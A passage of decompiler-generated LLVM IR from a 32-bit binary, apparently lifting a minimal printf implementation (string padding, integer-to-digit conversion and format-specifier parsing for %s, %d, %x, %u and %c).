  br label %dec_label_pc_8048498

dec_label_pc_8048498:                             ; preds = %dec_label_pc_8048481, %dec_label_pc_8048492
  %storemerge = phi i32 [ %v5_8048495, %dec_label_pc_8048492 ], [ 0, %dec_label_pc_8048481 ]
  %v1_804849b = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_804849b, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_80484a9

dec_label_pc_80484a9:                             ; preds = %dec_label_pc_8048498, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_8048498 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_8048498 ]
  %v1_80484ac = urem i32 %arg4, 2
  %v2_80484ac = icmp eq i32 %v1_80484ac, 0
  %v1_80484b1 = icmp eq i1 %v2_80484ac, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_80484b1, label %dec_label_pc_80484f3.preheader, label %dec_label_pc_80484cd.preheader

dec_label_pc_80484cd.preheader:                   ; preds = %dec_label_pc_80484a9
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_80484b5, label %dec_label_pc_80484f3.preheader

dec_label_pc_80484b5:                             ; preds = %dec_label_pc_80484cd.preheader, %dec_label_pc_80484b5
  %stack_var_-20.041 = phi i32 [ %v4_80484c7, %dec_label_pc_80484b5 ], [ 0, %dec_label_pc_80484cd.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_80484ca, %dec_label_pc_80484b5 ], [ %stack_var_12.0, %dec_label_pc_80484cd.preheader ]
  %v3_80484c2 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_80484c7 = add i32 %stack_var_-20.041, 1
  %v4_80484ca = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_80484ca, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_80484b5, label %dec_label_pc_80484f3.preheader

dec_label_pc_80484f3.preheader:                   ; preds = %dec_label_pc_80484cd.preheader, %dec_label_pc_80484b5, %dec_label_pc_80484a9
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_80484a9 ], [ %stack_var_12.0, %dec_label_pc_80484cd.preheader ], [ %v4_80484ca, %dec_label_pc_80484b5 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_80484a9 ], [ 0, %dec_label_pc_80484cd.preheader ], [ %v4_80484c7, %dec_label_pc_80484b5 ]
  %v4_80484f326 = ptrtoint i8* %arg2 to i32
  %v2_80484f627 = load i8, i8* %arg2, align 1
  %v4_80484f929 = icmp eq i8 %v2_80484f627, 0
  %v1_80484fb31 = icmp eq i1 %v4_80484f929, false
  br i1 %v1_80484fb31, label %dec_label_pc_80484d5, label %dec_label_pc_8048517.preheader

dec_label_pc_80484d5:                             ; preds = %dec_label_pc_80484f3.preheader, %dec_label_pc_80484d5
  %v4_80484f334 = phi i32 [ %v5_80484f0, %dec_label_pc_80484d5 ], [ %v4_80484f326, %dec_label_pc_80484f3.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_80484ed, %dec_label_pc_80484d5 ], [ %stack_var_-20.1.ph, %dec_label_pc_80484f3.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_80484f0, %dec_label_pc_80484d5 ], [ %arg2, %dec_label_pc_80484f3.preheader ]
  %v2_80484d8 = load i8, i8* %stack_var_8.032, align 1
  %v3_80484d8 = zext i8 %v2_80484d8 to i32
  %v3_80484e8 = call i32 @printchar(i32* %.pre, i32 %v3_80484d8)
  %v4_80484ed = add i32 %stack_var_-20.133, 1
  %v5_80484f0 = add i32 %v4_80484f334, 1
  %v22_80484f0 = inttoptr i32 %v5_80484f0 to i8*
  %v2_80484f6 = load i8, i8* %v22_80484f0, align 1
  %v4_80484f9 = icmp eq i8 %v2_80484f6, 0
  %v1_80484fb = icmp eq i1 %v4_80484f9, false
  br i1 %v1_80484fb, label %dec_label_pc_80484d5, label %dec_label_pc_8048517.preheader

dec_label_pc_8048517.preheader:                   ; preds = %dec_label_pc_80484d5, %dec_label_pc_80484f3.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484f3.preheader ], [ %v4_80484ed, %dec_label_pc_80484d5 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_80484ff, label %dec_label_pc_804851d

dec_label_pc_80484ff:                             ; preds = %dec_label_pc_8048517.preheader, %dec_label_pc_80484ff
  %stack_var_-20.225 = phi i32 [ %v4_8048511, %dec_label_pc_80484ff ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048517.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048514, %dec_label_pc_80484ff ], [ %stack_var_12.2.ph, %dec_label_pc_8048517.preheader ]
  %v3_804850c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048511 = add i32 %stack_var_-20.225, 1
  %v4_8048514 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048514, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_80484ff, label %dec_label_pc_804851d

dec_label_pc_804851d:                             ; preds = %dec_label_pc_80484ff, %dec_label_pc_8048517.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048517.preheader ], [ %v4_8048511, %dec_label_pc_80484ff ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048514, { 1, 0 }
  uselistorder i8* %v22_80484f0, { 1, 0 }
  uselistorder i32 %v5_80484f0, { 1, 0 }
  uselistorder i32 %v4_80484ca, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_8048474, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_80484ff, { 1, 0 }
  uselistorder label %dec_label_pc_80484d5, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80484b5, { 1, 0 }
  uselistorder label %dec_label_pc_8048498, { 1, 0 }
  uselistorder label %dec_label_pc_8048471, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048536 = trunc i64 %arg2 to i32
  %v5_804853c = icmp eq i32 %v4_8048536, 0
  %v6_804853c = icmp slt i32 %v4_8048536, 0
  %v1_8048540 = icmp eq i1 %v5_804853c, false
  br i1 %v1_8048540, label %dec_label_pc_8048572, label %dec_label_pc_8048542

dec_label_pc_8048542:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp42 = bitcast i32* %stack_var_-16 to i8*
  %v6_8048565 = call i32 @prints(i32 %arg1, i8* %tmp42, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_804865c

dec_label_pc_8048572:                             ; preds = %entry
  %v4_8048572 = icmp eq i32 %arg4, 0
  br i1 %v4_8048572, label %dec_label_pc_8048593, label %dec_label_pc_8048578

dec_label_pc_8048578:                             ; preds = %dec_label_pc_8048572
  %v13_8048578 = icmp eq i32 %arg3, 10
  %v1_804857c = icmp eq i1 %v13_8048578, false
  br i1 %v1_804857c, label %dec_label_pc_8048593, label %dec_label_pc_804857e

dec_label_pc_804857e:                             ; preds = %dec_label_pc_8048578
  %v1_8048582 = icmp eq i1 %v6_804853c, false
  br i1 %v1_8048582, label %dec_label_pc_8048593, label %dec_label_pc_8048584

dec_label_pc_8048584:                             ; preds = %dec_label_pc_804857e
  %v1_804858e = sub i32 0, %v4_8048536
  %v5_8048590 = sext i32 %v1_804858e to i64
  br label %dec_label_pc_8048593

dec_label_pc_8048593:                             ; preds = %dec_label_pc_804857e, %dec_label_pc_8048578, %dec_label_pc_8048572, %dec_label_pc_8048584
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_8048572 ], [ %arg2, %dec_label_pc_8048578 ], [ %arg2, %dec_label_pc_804857e ], [ %v5_8048590, %dec_label_pc_8048584 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_8048572 ], [ 0, %dec_label_pc_8048578 ], [ 0, %dec_label_pc_804857e ], [ 1, %dec_label_pc_8048584 ]
  %tmp43 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp43, align 4
  %v4_80485f48 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485f49 = icmp eq i32 %v4_80485f48, 0
  %v1_80485f816 = icmp eq i1 %v5_80485f49, false
  br i1 %v1_80485f816, label %dec_label_pc_80485a4.lr.ph, label %dec_label_pc_80485fa

dec_label_pc_80485a4.lr.ph:                       ; preds = %dec_label_pc_8048593
  %v5_80485a7 = sext i32 %arg3 to i64
  br label %dec_label_pc_80485a4

dec_label_pc_80485a4:                             ; preds = %dec_label_pc_80485a4.lr.ph, %dec_label_pc_80485cc
  %stack_var_-24.118 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80485a4.lr.ph ], [ %v5_80485f1, %dec_label_pc_80485cc ]
  %stack_var_-40.017 = phi i8* [ %tmp43, %dec_label_pc_80485a4.lr.ph ], [ %v22_80485cc, %dec_label_pc_80485cc ]
  %v6_80485b2 = and i64 %stack_var_-24.118, 4294967295
  %v12_80485b2 = udiv i64 %v6_80485b2, %v5_80485a7
  %v13_80485b2 = trunc i64 %v12_80485b2 to i32
  %v14_80485b2 = urem i64 %v6_80485b2, %v5_80485a7
  %v5_80485b7 = trunc i64 %v14_80485b2 to i8
  %v7_80485be = icmp sgt i8 %v5_80485b7, 9
  br i1 %v7_80485be, label %dec_label_pc_80485c0, label %dec_label_pc_80485cc

dec_label_pc_80485c0:                             ; preds = %dec_label_pc_80485a4
  %tmp = trunc i64 %v14_80485b2 to i32
  %v5_80485c3 = add i32 %tmp, %arg7
  %v1_80485c6 = add i32 %v5_80485c3, 198
  %v11_80485c6 = trunc i32 %v1_80485c6 to i8
  br label %dec_label_pc_80485cc

dec_label_pc_80485cc:                             ; preds = %dec_label_pc_80485a4, %dec_label_pc_80485c0
  %stack_var_-36.0 = phi i8 [ %v11_80485c6, %dec_label_pc_80485c0 ], [ %v5_80485b7, %dec_label_pc_80485a4 ]
  %v4_80485cc = ptrtoint i8* %stack_var_-40.017 to i32
  %v5_80485cc = add i32 %v4_80485cc, -1
  %v22_80485cc = inttoptr i32 %v5_80485cc to i8*
  %v2_80485d3 = add i8 %stack_var_-36.0, 48
  store i8 %v2_80485d3, i8* %v22_80485cc, align 1
  %v5_80485f1 = sext i32 %v13_80485b2 to i64
  %v5_80485f4 = icmp eq i32 %v13_80485b2, 0
  %v1_80485f8 = icmp eq i1 %v5_80485f4, false
  br i1 %v1_80485f8, label %dec_label_pc_80485a4, label %dec_label_pc_80485fa

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_80485cc, %dec_label_pc_8048593
  %stack_var_-40.0.lcssa = phi i8* [ %tmp43, %dec_label_pc_8048593 ], [ %v22_80485cc, %dec_label_pc_80485cc ]
  %v4_80485fa = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485fa, label %dec_label_pc_8048634, label %dec_label_pc_8048600

dec_label_pc_8048600:                             ; preds = %dec_label_pc_80485fa
  %v4_8048600 = icmp eq i32 %arg5, 0
  br i1 %v4_8048600, label %dec_label_pc_804862b, label %dec_label_pc_8048606

dec_label_pc_8048606:                             ; preds = %dec_label_pc_8048600
  %v1_8048609 = and i32 %arg6, 2
  %v2_8048609 = icmp eq i32 %v1_8048609, 0
  br i1 %v2_8048609, label %dec_label_pc_804862b, label %dec_label_pc_8048610

dec_label_pc_8048610:                             ; preds = %dec_label_pc_8048606
  %v3_804861e = inttoptr i32 %arg1 to i32*
  %v4_804861e = call i32 @printchar(i32* %v3_804861e, i32 45)
  %v4_8048626 = add i32 %arg5, -1
  br label %dec_label_pc_8048634

dec_label_pc_804862b:                             ; preds = %dec_label_pc_8048606, %dec_label_pc_8048600
  %v4_804862b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804862b = add i32 %v4_804862b, -1
  %v22_804862b = inttoptr i32 %v5_804862b to i8*
  store i8 45, i8* %v22_804862b, align 1
  br label %dec_label_pc_8048634

dec_label_pc_8048634:                             ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048610, %dec_label_pc_804862b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_80485fa ], [ %arg5, %dec_label_pc_804862b ], [ %v4_8048626, %dec_label_pc_8048610 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_80485fa ], [ %v22_804862b, %dec_label_pc_804862b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048610 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485fa ], [ 0, %dec_label_pc_804862b ], [ 1, %dec_label_pc_8048610 ]
  %v6_804864f = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_8048657 = add i32 %v6_804864f, %stack_var_-28.0
  store i32 %v2_8048657, i32* @edx, align 4
  br label %dec_label_pc_804865c

dec_label_pc_804865c:                             ; preds = %dec_label_pc_8048542, %dec_label_pc_8048634
  %storemerge = phi i32 [ %v2_8048657, %dec_label_pc_8048634 ], [ %v6_8048565, %dec_label_pc_8048542 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_80485cc, { 0, 2, 1 }
  uselistorder i8 %v5_80485b7, { 1, 0 }
  uselistorder i64 %v6_80485b2, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804865c, { 1, 0 }
  uselistorder label %dec_label_pc_8048634, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485cc, { 1, 0 }
  uselistorder label %dec_label_pc_80485a4, { 1, 0 }
  uselistorder label %dec_label_pc_8048593, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048661 = load i32, i32* @ebp, align 4
  store i32 %v0_8048661, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804891536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804891838 = icmp eq i8 %v2_804891536, 0
  %v1_804891a40 = icmp eq i1 %v4_804891838, false
  br i1 %v1_804891a40, label %dec_label_pc_8048673, label %dec_label_pc_8048920

dec_label_pc_8048673:                             ; preds = %entry, %dec_label_pc_804890f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804890f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804890f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804890f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804890f, %dec_label_pc_804890f ], [ %arg2, %entry ]
  %v2_8048676 = load i8, i8* %stack_var_8.444, align 1
  %v10_8048679 = icmp eq i8 %v2_8048676, 37
  %v1_804867b = icmp eq i1 %v10_8048679, false
  br i1 %v1_804867b, label %dec_label_pc_80488f4, label %dec_label_pc_8048681

dec_label_pc_8048681:                             ; preds = %dec_label_pc_8048673
  %v5_8048681 = add i32 %stack_var_8.4.in41, 1
  %v22_8048681 = inttoptr i32 %v5_8048681 to i8*
  %v2_8048694 = load i8, i8* %v22_8048681, align 1
  %v4_8048697 = icmp eq i8 %v2_8048694, 0
  br i1 %v4_8048697, label %dec_label_pc_8048920, label %dec_label_pc_804869f

dec_label_pc_804869f:                             ; preds = %dec_label_pc_8048681
  %v2_80486a2 = load i8, i8* %v22_8048681, align 1
  %v10_80486a5 = icmp eq i8 %v2_80486a2, 37
  br i1 %v10_80486a5, label %dec_label_pc_80488f4, label %dec_label_pc_80486ad

dec_label_pc_80486ad:                             ; preds = %dec_label_pc_804869f
  %v2_80486b0 = load i8, i8* %v22_8048681, align 1
  %v10_80486b3 = icmp eq i8 %v2_80486b0, 45
  %v1_80486b5 = icmp eq i1 %v10_80486b3, false
  br i1 %v1_80486b5, label %dec_label_pc_80486ca.preheader, label %dec_label_pc_80486b7

dec_label_pc_80486b7:                             ; preds = %dec_label_pc_80486ad
  %v5_80486b7 = add i32 %stack_var_8.4.in41, 2
  %v22_80486b7 = inttoptr i32 %v5_80486b7 to i8*
  br label %dec_label_pc_80486ca.preheader

dec_label_pc_80486ca.preheader:                   ; preds = %dec_label_pc_80486b7, %dec_label_pc_80486ad
  %stack_var_8.0.ph = phi i8* [ %v22_8048681, %dec_label_pc_80486ad ], [ %v22_80486b7, %dec_label_pc_80486b7 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80486ad ], [ 1, %dec_label_pc_80486b7 ]
  %v4_80486ca22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_80486cd23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_80486d030 = icmp eq i8 %v2_80486cd23, 48
  br i1 %v7_80486d030, label %dec_label_pc_80486c3, label %dec_label_pc_80486f9.preheader

dec_label_pc_80486c3:                             ; preds = %dec_label_pc_80486ca.preheader, %dec_label_pc_80486c3
  %v4_80486ca33 = phi i32 [ %v5_80486c3, %dec_label_pc_80486c3 ], [ %v4_80486ca22, %dec_label_pc_80486ca.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_80486c6, %dec_label_pc_80486c3 ], [ %stack_var_-32.0.ph, %dec_label_pc_80486ca.preheader ]
  %v5_80486c3 = add i32 %v4_80486ca33, 1
  %v22_80486c3 = inttoptr i32 %v5_80486c3 to i8*
  %v4_80486c6 = or i32 %stack_var_-32.032, 2
  %v2_80486cd = load i8, i8* %v22_80486c3, align 1
  %v7_80486d0 = icmp eq i8 %v2_80486cd, 48
  br i1 %v7_80486d0, label %dec_label_pc_80486c3, label %dec_label_pc_80486f9.preheader

dec_label_pc_80486f9.preheader:                   ; preds = %dec_label_pc_80486c3, %dec_label_pc_80486ca.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_80486ca.preheader ], [ %v22_80486c3, %dec_label_pc_80486c3 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_80486ca.preheader ], [ %v4_80486c6, %dec_label_pc_80486c3 ]
  br label %dec_label_pc_80486f9

dec_label_pc_80486d6:                             ; preds = %dec_label_pc_8048703
  %v2_80486df = mul i32 %stack_var_-36.0, 10
  %v2_80486e7 = load i8, i8* %stack_var_8.1, align 1
  %v3_80486e7 = zext i8 %v2_80486e7 to i32
  %v5_80486ed = add i32 %v3_80486e7, %v2_80486df
  %v1_80486f0 = add i32 %v5_80486ed, -48
  %v5_80486f6 = add i32 %v4_80486f9, 1
  %v22_80486f6 = inttoptr i32 %v5_80486f6 to i8*
  br label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486f9.preheader, %dec_label_pc_80486d6
  %stack_var_8.1 = phi i8* [ %v22_80486f6, %dec_label_pc_80486d6 ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486f9.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_80486f0, %dec_label_pc_80486d6 ], [ 0, %dec_label_pc_80486f9.preheader ]
  %v4_80486f9 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_80486fc = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_80486fc, 48
  br i1 %tmp, label %dec_label_pc_804870d, label %dec_label_pc_8048703

dec_label_pc_8048703:                             ; preds = %dec_label_pc_80486f9
  %v2_8048706 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048706, 58
  br i1 %tmp48, label %dec_label_pc_80486d6, label %dec_label_pc_804870d

dec_label_pc_804870d:                             ; preds = %dec_label_pc_8048703, %dec_label_pc_80486f9
  %v2_8048710 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048713 = icmp eq i8 %v2_8048710, 115
  %v1_8048715 = icmp eq i1 %v10_8048713, false
  br i1 %v1_8048715, label %dec_label_pc_8048764, label %dec_label_pc_8048717

dec_label_pc_8048717:                             ; preds = %dec_label_pc_804870d
  %v1_804871a = add i32 %stack_var_12.142, 4
  %v1_8048722 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048722 = load i32, i32* %v1_8048722, align 4
  %v4_8048727 = icmp eq i32 %v2_8048722, 0
  br i1 %v4_8048727, label %dec_label_pc_804873c, label %dec_label_pc_804872d

dec_label_pc_804872d:                             ; preds = %dec_label_pc_8048717
  %v5_8048730 = inttoptr i32 %v2_8048722 to i8*
  br label %dec_label_pc_804873c

dec_label_pc_804873c:                             ; preds = %dec_label_pc_8048717, %dec_label_pc_804872d
  %storemerge = phi i8* [ %v5_8048730, %dec_label_pc_804872d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8052a22.18, i32 0, i32 0), %dec_label_pc_8048717 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_8048757 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804875c = add i32 %v6_8048757, %stack_var_-28.143
  br label %dec_label_pc_804890f

dec_label_pc_8048764:                             ; preds = %dec_label_pc_804870d
  %v2_8048767 = load i8, i8* %stack_var_8.1, align 1
  %v10_804876a = icmp eq i8 %v2_8048767, 100
  %v1_804876c = icmp eq i1 %v10_804876a, false
  br i1 %v1_804876c, label %dec_label_pc_80487b8, label %dec_label_pc_804876e

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048764
  %v1_8048771 = add i32 %stack_var_12.142, 4
  %v1_8048779 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048779 = load i32, i32* %v1_8048779, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487ab = sext i32 %v2_8048779 to i64
  %v9_80487ab = call i32 @printi(i32 %tmp6, i64 %v8_80487ab, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_80487b0 = add i32 %v9_80487ab, %stack_var_-28.143
  br label %dec_label_pc_804890f

dec_label_pc_80487b8:                             ; preds = %dec_label_pc_8048764
  %v2_80487bb = load i8, i8* %stack_var_8.1, align 1
  %v10_80487be = icmp eq i8 %v2_80487bb, 120
  %v1_80487c0 = icmp eq i1 %v10_80487be, false
  br i1 %v1_80487c0, label %dec_label_pc_804880c, label %dec_label_pc_80487c2

dec_label_pc_80487c2:                             ; preds = %dec_label_pc_80487b8
  %v1_80487c5 = add i32 %stack_var_12.142, 4
  %v1_80487cd = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487cd = load i32, i32* %v1_80487cd, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487ff = sext i32 %v2_80487cd to i64
  %v9_80487ff = call i32 @printi(i32 %tmp6, i64 %v8_80487ff, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048804 = add i32 %v9_80487ff, %stack_var_-28.143
  br label %dec_label_pc_804890f

dec_label_pc_804880c:                             ; preds = %dec_label_pc_80487b8
  %v2_804880f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048812 = icmp eq i8 %v2_804880f, 88
  %v1_8048814 = icmp eq i1 %v10_8048812, false
  br i1 %v1_8048814, label %dec_label_pc_8048860, label %dec_label_pc_8048816

dec_label_pc_8048816:                             ; preds = %dec_label_pc_804880c
  %v1_8048819 = add i32 %stack_var_12.142, 4
  %v1_8048821 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048821 = load i32, i32* %v1_8048821, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048853 = sext i32 %v2_8048821 to i64
  %v9_8048853 = call i32 @printi(i32 %tmp6, i64 %v8_8048853, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_8048858 = add i32 %v9_8048853, %stack_var_-28.143
  br label %dec_label_pc_804890f

dec_label_pc_8048860:                             ; preds = %dec_label_pc_804880c
  %v2_8048863 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048866 = icmp eq i8 %v2_8048863, 117
  %v1_8048868 = icmp eq i1 %v10_8048866, false
  br i1 %v1_8048868, label %dec_label_pc_80488b1, label %dec_label_pc_804886a

dec_label_pc_804886a:                             ; preds = %dec_label_pc_8048860
  %v1_804886d = add i32 %stack_var_12.142, 4
  %v1_8048875 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048875 = load i32, i32* %v1_8048875, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80488a7 = sext i32 %v2_8048875 to i64
  %v9_80488a7 = call i32 @printi(i32 %tmp6, i64 %v8_80488a7, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_80488ac = add i32 %v9_80488a7, %stack_var_-28.143
  br label %dec_label_pc_804890f

dec_label_pc_80488b1:                             ; preds = %dec_label_pc_8048860
  %v2_80488b4 = load i8, i8* %stack_var_8.1, align 1
  %v10_80488b7 = icmp eq i8 %v2_80488b4, 99
  %v1_80488b9 = icmp eq i1 %v10_80488b7, false
  br i1 %v1_80488b9, label %dec_label_pc_804890f, label %dec_label_pc_80488bb

dec_label_pc_80488bb:                             ; preds = %dec_label_pc_80488b1
  %v1_80488be = add i32 %stack_var_12.142, 4
  %v1_80488c6 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80488c6 = load i32, i32* %v1_80488c6, align 4
  store i32 %v2_80488c6, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80488ea = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80488ef = add i32 %v6_80488ea, %stack_var_-28.143
  br label %dec_label_pc_804890f

dec_label_pc_80488f4:                             ; preds = %dec_label_pc_804869f, %dec_label_pc_8048673
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_8048673 ], [ %v22_8048681, %dec_label_pc_804869f ]
  %v2_80488f7 = load i8, i8* %stack_var_8.2, align 1
  %v3_80488f7 = zext i8 %v2_80488f7 to i32
  %v4_8048907 = call i32 @printchar(i32* %arg1, i32 %v3_80488f7)
  %v4_804890c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804890f

dec_label_pc_804890f:                             ; preds = %dec_label_pc_80488b1, %dec_label_pc_80488bb, %dec_label_pc_804886a, %dec_label_pc_8048816, %dec_label_pc_80487c2, %dec_label_pc_804876e, %dec_label_pc_804873c, %dec_label_pc_80488f4
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80488f4 ], [ %stack_var_8.1, %dec_label_pc_80488b1 ], [ %stack_var_8.1, %dec_label_pc_80488bb ], [ %stack_var_8.1, %dec_label_pc_804886a ], [ %stack_var_8.1, %dec_label_pc_8048816 ], [ %stack_var_8.1, %dec_label_pc_80487c2 ], [ %stack_var_8.1, %dec_label_pc_804876e ], [ %stack_var_8.1, %dec_label_pc_804873c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_80488f4 ], [ %stack_var_12.142, %dec_label_pc_80488b1 ], [ %v1_80488be, %dec_label_pc_80488bb ], [ %v1_804886d, %dec_label_pc_804886a ], [ %v1_8048819, %dec_label_pc_8048816 ], [ %v1_80487c5, %dec_label_pc_80487c2 ], [ %v1_8048771, %dec_label_pc_804876e ], [ %v1_804871a, %dec_label_pc_804873c ]
  %stack_var_-28.0 = phi i32 [ %v4_804890c, %dec_label_pc_80488f4 ], [ %stack_var_-28.143, %dec_label_pc_80488b1 ], [ %v5_80488ef, %dec_label_pc_80488bb ], [ %v5_80488ac, %dec_label_pc_804886a ], [ %v5_8048858, %dec_label_pc_8048816 ], [ %v5_8048804, %dec_label_pc_80487c2 ], [ %v5_80487b0, %dec_label_pc_804876e ], [ %v5_804875c, %dec_label_pc_804873c ]
  %v4_804890f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804890f = add i32 %v4_804890f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804890f to i8*
  %v2_8048915 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048918 = icmp eq i8 %v2_8048915, 0
  %v1_804891a = icmp eq i1 %v4_8048918, false
  br i1 %v1_804891a, label %dec_label_pc_8048673, label %dec_label_pc_8048920

dec_label_pc_8048920:                             ; preds = %dec_label_pc_804890f, %dec_label_pc_8048681, %entry
